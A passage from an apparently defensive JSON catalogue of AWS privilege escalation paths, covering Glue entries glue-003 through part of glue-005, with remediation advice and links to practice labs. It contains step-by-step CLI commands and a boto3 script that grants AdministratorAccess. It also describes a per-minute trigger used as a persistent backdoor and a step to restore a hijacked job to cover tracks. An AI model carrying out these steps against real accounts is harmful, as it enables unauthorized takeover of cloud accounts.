          "command": "aws glue create-job \\\n  --region us-east-1 \\\n  --name privesc-glue-job \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --command \"Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9\" \\\n  --default-arguments '{\"--job-language\":\"python\"}' \\\n  --max-capacity 0.0625 \\\n  --timeout 5\n",
          "description": "Create a Glue Python shell job with the privileged role. The --role parameter uses iam:PassRole to assign the administrative role to the job. The ScriptLocation points to your malicious Python script."
        },
        {
          "step": 3,
          "command": "aws glue start-job-run \\\n  --region us-east-1 \\\n  --job-name privesc-glue-job\n",
          "description": "Start the Glue job run. This executes your Python script with the privileges of the administrative role you passed to the job."
        },
        {
          "step": 4,
          "command": "# Wait 1-2 minutes for job completion, then verify\naws glue get-job-run \\\n  --region us-east-1 \\\n  --job-name privesc-glue-job \\\n  --run-id JOB_RUN_ID \\\n  --query 'JobRun.JobRunState'\n",
          "description": "Monitor the job execution status. Wait for the JobRunState to show SUCCEEDED, which indicates your script has completed execution."
        },
        {
          "step": 5,
          "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
          "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions by executing a privileged operation."
        }
      ]
    },
    "recommendation": "**Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::*:role/approved-glue-roles-*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": [\n    \"arn:aws:iam::*:role/*admin*\",\n    \"arn:aws:iam::*:role/*Admin*\"\n  ],\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Monitor CloudTrail for Glue job creation:** Alert on `CreateJob` API calls, especially when combined with PassRole on privileged roles or when using inline commands. Look for unusual patterns of Glue job creation by users who don't typically use Glue.\n\n**Restrict glue:CreateJob and glue:StartJobRun permissions:** Only grant these permissions to users who legitimately need to create and run Glue jobs (data engineers, ETL developers). These are powerful permissions that should be tightly controlled.\n\n**Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n**Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs access\u2014not IAM permissions.\n\n**Require S3-stored scripts:** Enforce policies that require all Glue job scripts to be stored in audited S3 buckets rather than allowing inline scripts. Monitor S3 buckets containing Glue scripts for unauthorized modifications.\n",
    "discoveredBy": {
      "name": "nobodynate",
      "organization": "Unknown",
      "date": "Unknown"
    },
    "references": [
      {
        "title": "HackTricks - AWS Glue Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
      },
      {
        "title": "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough",
        "url": "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
      },
      {
        "title": "CloudGoat - glue_privesc Scenario",
        "url": "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
      },
      {
        "title": "AWS Glue Jobs Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/dg/author-job.html"
      },
      {
        "title": "AWS Glue Python Shell Jobs",
        "url": "https://docs.aws.amazon.com/glue/latest/dg/add-job-python.html"
      },
      {
        "title": "AWS IAM PassRole Documentation",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
      }
    ],
    "relatedPaths": [
      "glue-001",
      "glue-002",
      "glue-004",
      "glue-005",
      "lambda-001",
      "ec2-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+glue-createjob+glue-startjobrun",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "glue_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS Glue privilege escalation attacks"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `iam:PassRole`, `glue:CreateJob`, and `glue:StartJobRun` permissions. Can be an IAM user or role.\n\nThis principal can create new Glue jobs and pass IAM roles to them, then manually trigger their execution.\n"
        },
        {
          "id": "glue_job",
          "label": "New Glue Job",
          "type": "resource",
          "description": "A new AWS Glue Python shell job created by the attacker. The job is configured with:\n- **Role**: The privileged role passed via iam:PassRole\n- **Script**: Python script that performs privilege escalation\n- **Command**: pythonshell execution environment\n\nThe job definition is created but not yet executed.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the glue Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Glue job. This role must have a trust policy allowing glue.amazonaws.com to assume it.\n\nThe permissions of this role determine what the Glue job can do when it executes. The job will run with the temporary credentials of this role.\n"
        },
        {
          "id": "job_execution",
          "label": "Job Executes with Passed Role",
          "type": "action",
          "description": "The Glue job is started manually using `glue:StartJobRun`. The job execution begins in the AWS Glue managed environment.\n\nDuring execution, the job assumes the passed role and receives temporary credentials. The Python script runs with these credentials and can perform any actions the role permits.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.\n\nThe starting principal now has full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Some Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions but not full IAM write access. The script may be able to:\n- Access sensitive data in S3, databases, or other AWS services\n- Perform actions that enable multi-hop privilege escalation\n- Read secrets from AWS Secrets Manager or Parameter Store\n\nFurther exploration is needed to determine the full scope of access gained.\n"
        },
        {
          "id": "no_perms",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation.\n\nHowever, this still demonstrates a security gap that should be addressed.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "glue_job",
          "label": "iam:PassRole + glue:CreateJob",
          "description": "The starting principal creates a new Glue job and passes the target role to it using the following command:\n\n```bash\naws glue create-job \\\n  --name privesc-glue-job \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --command \"Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9\"\n```\n\nThe `--role` parameter invokes iam:PassRole to assign the privileged role.\n"
        },
        {
          "from": "glue_job",
          "to": "target_role",
          "label": "Role assigned to job",
          "description": "The target role is configured as the execution role for the Glue job. When the job runs, it will assume this role and receive temporary credentials.\n"
        },
        {
          "from": "target_role",
          "to": "job_execution",
          "label": "glue:StartJobRun",
          "description": "The starting principal manually triggers the job execution:\n\n```bash\naws glue start-job-run --job-name privesc-glue-job\n```\n\nThe job begins executing in the Glue managed environment with the passed role's credentials.\n"
        },
        {
          "from": "job_execution",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or iam:AttachUserPolicy permission, the Python script successfully attaches the AdministratorAccess policy to the starting principal.\n\nExample script:\n```python\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='starting-principal',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n"
        },
        {
          "from": "job_execution",
          "to": "some_perms",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not IAM write access, the attacker may gain access to:\n- Sensitive data in S3, RDS, DynamoDB, etc.\n- Secrets in AWS Secrets Manager or Systems Manager Parameter Store\n- Multi-hop privilege escalation opportunities\n"
        },
        {
          "from": "job_execution",
          "to": "no_perms",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has basic Glue service permissions (e.g., AWSGlueServiceRole), the script cannot perform meaningful privilege escalation.\n\nThe job will execute but cannot modify IAM or access sensitive resources.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-003.yaml"
  },
  {
    "id": "glue-004",
    "name": "iam:PassRole + glue:CreateJob + glue:CreateTrigger",
    "category": "service-passrole",
    "services": [
      "iam",
      "glue"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must be able to pass a role to glue.amazonaws.com"
        },
        {
          "permission": "glue:CreateJob",
          "resourceConstraints": "Must be able to create Glue jobs"
        },
        {
          "permission": "glue:CreateTrigger",
          "resourceConstraints": "Must be able to create Glue triggers with --start-on-creation flag"
        }
      ],
      "additional": [
        {
          "permission": "glue:GetJob",
          "resourceConstraints": "Helpful for retrieving job details and verifying configuration"
        },
        {
          "permission": "glue:GetTrigger",
          "resourceConstraints": "Useful for monitoring trigger state and activation status"
        },
        {
          "permission": "glue:GetJobRun",
          "resourceConstraints": "Helpful for monitoring job execution details"
        },
        {
          "permission": "glue:GetJobRuns",
          "resourceConstraints": "Useful for listing job runs to track execution history"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available privileged roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `glue:CreateJob`, and `glue:CreateTrigger` can create an AWS Glue job with a privileged IAM role and establish a scheduled trigger that automatically executes the job. Unlike manual execution via `glue:StartJobRun`, this technique creates a persistent attack mechanism through scheduled automation. AWS Glue triggers are automation components that can start jobs based on schedules (cron expressions), events, or on-demand. When a trigger is created with the `--start-on-creation` flag, it immediately activates and begins executing the associated job according to its schedule (e.g., every minute). The trigger-based approach is particularly dangerous because it demonstrates a persistence pattern rather than just immediate exploitation. The attacker creates a scheduled job that continuously grants administrative access, making it harder to detect and remediate. This technique shows how AWS service automation features can be abused for persistent privilege escalation. The job executes Python code that modifies IAM permissions to grant the starting principal administrative access, and the trigger ensures this runs repeatedly on a schedule.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role's permissions determine the level of access gained"
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service. The persistent nature of triggers means access can be re-granted even after remediation attempts if the trigger is not identified and removed.\n",
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Create Python script that attaches admin policy (upload to S3)\n# Example script content:\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='target-username',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n",
          "description": "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. This script must be uploaded to an S3 bucket that the Glue job can access."
        },
        {
          "step": 2,
          "command": "aws glue create-job \\\n  --region us-east-1 \\\n  --name privesc-glue-job \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --command \"Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9\" \\\n  --default-arguments '{\"--job-language\":\"python\"}' \\\n  --max-capacity 0.0625 \\\n  --timeout 5\n",
          "description": "Create a Glue Python shell job with the privileged role. The --role parameter uses iam:PassRole to assign the administrative role to the job. The ScriptLocation points to your malicious Python script."
        },
        {
          "step": 3,
          "command": "aws glue create-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"privesc-glue-job\"}]'\n",
          "description": "Create a scheduled trigger with --start-on-creation flag. This immediately activates the trigger and schedules the job to run every minute. The trigger will fire at the next scheduled time and execute the malicious job automatically without requiring glue:StartJobRun permission."
        },
        {
          "step": 4,
          "command": "# Wait 1-3 minutes for trigger to fire and job to complete\naws glue get-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --query 'Trigger.State'\n",
          "description": "Verify the trigger state shows ACTIVATED. Scheduled triggers fire at the next scheduled time (every minute in this case). Wait for the job to execute automatically."
        },
        {
          "step": 5,
          "command": "aws glue get-job-runs \\\n  --region us-east-1 \\\n  --job-name privesc-glue-job \\\n  --max-results 1 \\\n  --query 'JobRuns[0].JobRunState'\n",
          "description": "Check the latest job run to confirm it has executed. Wait for JobRunState to show SUCCEEDED, indicating your script has completed and administrative access has been granted."
        },
        {
          "step": 6,
          "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
          "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed."
        }
      ]
    },
    "recommendation": "**Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::*:role/approved-glue-roles-*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": [\n    \"arn:aws:iam::*:role/*admin*\",\n    \"arn:aws:iam::*:role/*Admin*\"\n  ],\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Monitor CloudTrail for Glue job and trigger creation:** Alert on `CreateJob` and `CreateTrigger` API calls, especially when:\n- Combined with PassRole on privileged roles\n- Triggers are created with `StartOnCreation=true`\n- Jobs use inline scripts or scripts from non-standard S3 locations\n- Execution intervals are suspiciously frequent (every minute)\n- Jobs are created by users who don't typically work with Glue\n\n**Restrict glue:CreateJob and glue:CreateTrigger permissions:** Only grant these permissions to users who legitimately need to create ETL workflows (data engineers). This is particularly important for trigger creation, which enables persistence.\n\n**Limit trigger scheduling frequencies:** Implement organizational policies or SCPs that prevent creation of triggers with very frequent schedules (e.g., every minute), as these are often indicators of abuse rather than legitimate ETL workflows.\n\n**Monitor IAM policy changes from Glue service principal:** Set up CloudWatch alarms for IAM policy modifications (`AttachUserPolicy`, `AttachRolePolicy`, `PutUserPolicy`, `PutRolePolicy`) where the source is the Glue service principal. This can indicate abuse of Glue jobs for privilege escalation.\n\n**Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n**Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs access\u2014not IAM permissions.\n",
    "discoveredBy": {
      "name": "Carlos Polop",
      "organization": "HackTricks",
      "date": "Unknown"
    },
    "references": [
      {
        "title": "HackTricks - AWS Glue Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
      },
      {
        "title": "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough",
        "url": "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
      },
      {
        "title": "CloudGoat - glue_privesc Scenario",
        "url": "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
      },
      {
        "title": "AWS Glue CreateTrigger API Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/webapi/API_CreateTrigger.html"
      },
      {
        "title": "AWS Glue Jobs Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/dg/author-job.html"
      },
      {
        "title": "AWS IAM PassRole Documentation",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
      }
    ],
    "relatedPaths": [
      "glue-001",
      "glue-002",
      "glue-003",
      "glue-006",
      "lambda-001",
      "ec2-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+glue-createjob+glue-createtrigger",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "glue_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS Glue privilege escalation attacks"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `iam:PassRole`, `glue:CreateJob`, and `glue:CreateTrigger` permissions. Can be an IAM user or role.\n\nThis principal can create new Glue jobs, pass IAM roles to them, and create scheduled triggers for automated execution.\n"
        },
        {
          "id": "glue_job",
          "label": "New Glue Job",
          "type": "resource",
          "description": "A new AWS Glue Python shell job created by the attacker. The job is configured with:\n- **Role**: The privileged role passed via iam:PassRole\n- **Script**: Python script that performs privilege escalation\n- **Command**: pythonshell execution environment\n\nA scheduled trigger is also created with `--start-on-creation` to execute this job automatically every minute, providing **persistence**.\n\n```bash\n# Create the job\naws glue create-job \\\n  --name privesc-glue-job \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --command \"Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9\"\n\n# Create trigger for persistence\naws glue create-trigger \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"privesc-glue-job\"}]'\n```\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the glue Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Glue job. This role must have a trust policy allowing glue.amazonaws.com to assume it.\n\nWhen the job runs (triggered automatically every minute), it assumes this role and receives temporary credentials. The permissions of this role determine what the malicious script can accomplish.\n"
        },
        {
          "id": "execute_code",
          "label": "Execute Code with Target Role Permissions",
          "type": "action",
          "description": "The scheduled trigger fires automatically (every minute) and starts the Glue job. No manual `glue:StartJobRun` is needed.\n\nThe job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs repeatedly on each trigger activation:\n\n```python\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='starting-principal',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\n**Persistence**: The trigger continues to fire every minute, repeatedly executing this code.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator + Persistent Backdoor",
          "type": "outcome",
          "description": "The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.\n\n**Persistence**: The trigger continues to fire every minute, re-granting administrative access even if the policy attachment is removed. This creates a persistent backdoor that is difficult to remediate without identifying and deleting the trigger.\n"
        },
        {
          "id": "some_perms",
          "label": "Some Additional Access + Persistence",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions but not full IAM write access. The script may gain access to:\n- Sensitive data in S3, databases, or other AWS services\n- Secrets in AWS Secrets Manager or Parameter Store\n- Multi-hop privilege escalation opportunities\n\n**Persistence**: The trigger continues to fire, repeatedly performing these actions every minute.\n"
        },
        {
          "id": "no_perms",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation.\n\nHowever, the trigger continues to fire every minute, consuming resources and demonstrating a security gap.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "glue_job",
          "label": "glue:CreateJob + glue:CreateTrigger",
          "description": "The starting principal creates a new Glue job (using `iam:PassRole` to assign the privileged role) and immediately creates a scheduled trigger with `--start-on-creation` to automate its execution.\n\nThis creates a **persistent attack mechanism** where the job automatically executes every minute without requiring manual intervention.\n"
        },
        {
          "from": "glue_job",
          "to": "target_role",
          "label": "Job assumes passed role",
          "description": "When the trigger fires and the job starts executing, it automatically assumes the target role that was passed during job creation. The Glue service requests temporary credentials from AWS STS for this role.\n\nThe job now has all the permissions granted to the target role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_code",
          "label": "Script executes with role permissions",
          "description": "The malicious Python script executes in the Glue job environment with the temporary credentials from the target role. The script uses boto3 to interact with AWS APIs and attempt privilege escalation.\n\nThis happens **repeatedly every minute** as the trigger continues to fire, providing persistence.\n"
        },
        {
          "from": "execute_code",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or `iam:AttachUserPolicy` permission, the script successfully attaches the AdministratorAccess policy to the starting principal.\n\nThe trigger continues to fire every minute, making this a **persistent backdoor** that re-grants admin access even if manually removed.\n"
        },
        {
          "from": "execute_code",
          "to": "some_perms",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not IAM write access, the attacker gains partial access such as reading sensitive data or accessing other AWS services.\n\nThe trigger provides persistence, repeatedly performing these actions every minute.\n"
        },
        {
          "from": "execute_code",
          "to": "no_perms",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has basic Glue service permissions, the script cannot perform meaningful privilege escalation.\n\nHowever, the trigger continues firing every minute, demonstrating a security gap.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-004.yaml"
  },
  {
    "id": "glue-005",
    "name": "iam:PassRole + glue:UpdateJob + glue:StartJobRun",
    "category": "service-passrole",
    "services": [
      "iam",
      "glue"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must be able to pass a role to glue.amazonaws.com"
        },
        {
          "permission": "glue:UpdateJob",
          "resourceConstraints": "Must be able to update existing Glue job configurations"
        },
        {
          "permission": "glue:StartJobRun",
          "resourceConstraints": "Must be able to start Glue job runs"
        }
      ],
      "additional": [
        {
          "permission": "glue:GetJob",
          "resourceConstraints": "Helpful for retrieving current job configuration before modification"
        },
        {
          "permission": "glue:ListJobs",
          "resourceConstraints": "Useful for discovering existing Glue jobs that can be modified"
        },
        {
          "permission": "glue:GetJobRun",
          "resourceConstraints": "Helpful for monitoring job execution details"
        },
        {
          "permission": "glue:GetJobRuns",
          "resourceConstraints": "Useful for listing job runs to track execution history"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available privileged roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` can modify an existing AWS Glue ETL job to execute with an administrative role and malicious Python code that grants the starting principal administrative access. Unlike the `glue:CreateJob` privilege escalation technique where an attacker creates a new Glue job, this scenario exploits the ability to update an existing job that already exists in the environment. This approach can be stealthier because existing Glue jobs are common in production environments running legitimate ETL workloads, updating a job generates different CloudTrail events than creating new resources, security monitoring may focus more on resource creation than modification, and the attack can blend in with normal job maintenance activities. When updating a Glue job, an attacker can change both the IAM role the job uses (via `iam:PassRole`) and the script location. By pointing the job to a malicious Python script and passing an administrative role, they can execute arbitrary code with elevated privileges when the job runs. The attacker modifies an existing job's configuration to use a privileged role and malicious script location, manually starts the job execution, and the job executes Python code that modifies IAM permissions to grant the starting principal administrative access.",
    "prerequisites": {
      "admin": [
        "An existing Glue job must be present in the environment that can be modified",
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "An existing Glue job must be present in the environment that can be modified",
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role's permissions determine the level of access gained"
      ]
    },
    "limitations": "This path requires a pre-existing Glue job to modify, unlike glue:CreateJob which can be executed in any environment. The path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service. This technique is harder to detect than CreateJob because job updates are routine operational activities.\n",
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# List existing Glue jobs to find one to modify\naws glue list-jobs --region us-east-1\n",
          "description": "Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequently or are not actively monitored are ideal targets."
        },
        {
          "step": 2,
          "command": "# View current job configuration\naws glue get-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --query 'Job.{Role: Role, Script: Command.ScriptLocation}'\n",
          "description": "Retrieve the current job configuration to see its existing role and script location. Document these values if you need to restore the job after the attack."
        },
        {
          "step": 3,
          "command": "# Create Python script that attaches admin policy (upload to S3)\n# Example script content:\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='target-username',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n",
          "description": "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an S3 bucket that the Glue job can access."
        },
        {
          "step": 4,
          "command": "aws glue update-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n",
          "description": "Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:PassRole to assign the administrative role. The ScriptLocation is changed to your escalation script."
        },
        {
          "step": 5,
          "command": "aws glue start-job-run \\\n  --region us-east-1 \\\n  --job-name existing-job-name\n",
          "description": "Start the updated Glue job. This executes your malicious Python script with the privileges of the administrative role you passed to the job."
        },
        {
          "step": 6,
          "command": "# Wait 1-2 minutes for job completion\naws glue get-job-run \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --run-id JOB_RUN_ID \\\n  --query 'JobRun.JobRunState'\n",
          "description": "Monitor the job execution status. Wait for the JobRunState to show SUCCEEDED, which indicates your script has completed execution."
        },
        {
          "step": 7,
          "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
          "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions by executing a privileged operation."
        },
        {
          "step": 8,
          "command": "# Optional: Restore original job configuration to cover tracks\naws glue update-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/ORIGINAL_ROLE,Command={Name=pythonshell,ScriptLocation=s3://original-bucket/original_script.py,PythonVersion=3.9}\"\n",
          "description": "Optionally restore the job to its original configuration to reduce the likelihood of detection. Use the values you documented in step 2."
        }
      ]
    },
